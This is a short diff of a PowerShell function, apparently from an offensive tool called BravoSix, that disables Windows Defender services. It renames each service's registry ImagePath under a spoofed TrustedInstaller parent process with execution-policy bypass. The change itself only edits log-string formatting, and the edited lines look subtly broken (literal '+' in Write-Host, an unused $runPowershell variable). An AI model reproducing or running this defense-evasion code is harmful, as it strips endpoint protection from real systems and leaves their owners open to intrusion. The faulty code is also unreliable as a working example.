@@ -26,9 +26,9 @@ function BravoSix {
     foreach ($service in $defenderServices) {
         Write-Host "[i] Disabling $service service..."
         Write-Host "[i] Renaming $service service ImagePath type to BravoSix ..."
-        Write-Host "[i] Original ImagePath value: {}".format((Get-ItemProperty -Path $servicesRegPath$service -Name ImagePath).ImagePath)   
+        Write-Host "[i] Original ImagePath value: " + (Get-ItemProperty -Path $servicesRegPath$service -Name ImagePath).ImagePath 
         $runPowershell = "-ExecutionPolicy Bypass -Command ""& {Rename-ItemProperty -Path $servicesRegPath$service -Name ImagePath -NewName BravoSix; Start-Sleep 5;}"""
-        Write-Host "[i] Confirming ImagePath value: {}".format((Get-ItemProperty -Path $servicesRegPath$service -Name ImagePath).ImagePath)
+        Write-Host "[i] Confirming ImagePath value: " + (Get-ItemProperty -Path $servicesRegPath$service -Name ImagePath).ImagePath
         [GetTrustedInstaller.spawnPPID]::Run($serviceProcessId, $powershellPath, $powershellArg)
     }
 }
